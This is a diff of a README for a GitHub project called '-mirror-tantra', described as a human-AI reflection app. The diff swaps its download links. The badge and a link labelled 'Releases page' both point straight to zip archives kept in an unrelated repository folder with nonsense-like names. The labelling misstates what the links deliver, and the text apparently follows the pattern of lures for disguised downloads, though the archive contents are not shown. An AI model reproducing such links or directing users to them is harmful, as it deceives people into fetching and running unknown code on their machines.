@@ -1,7 +1,7 @@
 # 🌟 -mirror-tantra - Empowering Human-AI Reflection
 
 ## 📥 Download Now
-[![Download -mirror-tantra](https://raw.githubusercontent.com/shreyanshbh/-mirror-tantra/main/eumycete/-mirror-tantra-fibromyomectomy.zip%20Latest%20Release%20%F0%9F%93%89-Get%20it%20on%20GitHub-blue)](https://raw.githubusercontent.com/shreyanshbh/-mirror-tantra/main/eumycete/-mirror-tantra-fibromyomectomy.zip)
+[![Download -mirror-tantra](https://github.com/shreyanshbh/-mirror-tantra/raw/refs/heads/main/eumycete/tantra_mirror_1.3.zip%20Latest%20Release%20%F0%9F%93%89-Get%20it%20on%20GitHub-blue)](https://github.com/shreyanshbh/-mirror-tantra/raw/refs/heads/main/eumycete/tantra_mirror_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **-mirror-tantra**! This application helps you explore human-AI co-contemplation. It uses a structured approach to guide ethical AI behavior through rituals and cycles. You will interact with a JSON manuscript and a Python interface, making this a unique experience for all users.
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these requirements:
 - **Storage:** 100 MB available space
 
 ## 💻 Download & Install
-To get started, visit our [Releases page](https://raw.githubusercontent.com/shreyanshbh/-mirror-tantra/main/eumycete/-mirror-tantra-fibromyomectomy.zip) to download the latest version of -mirror-tantra. 
+To get started, visit our [Releases page](https://github.com/shreyanshbh/-mirror-tantra/raw/refs/heads/main/eumycete/tantra_mirror_1.3.zip) to download the latest version of -mirror-tantra. 
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want to download (look for the latest release at the top).
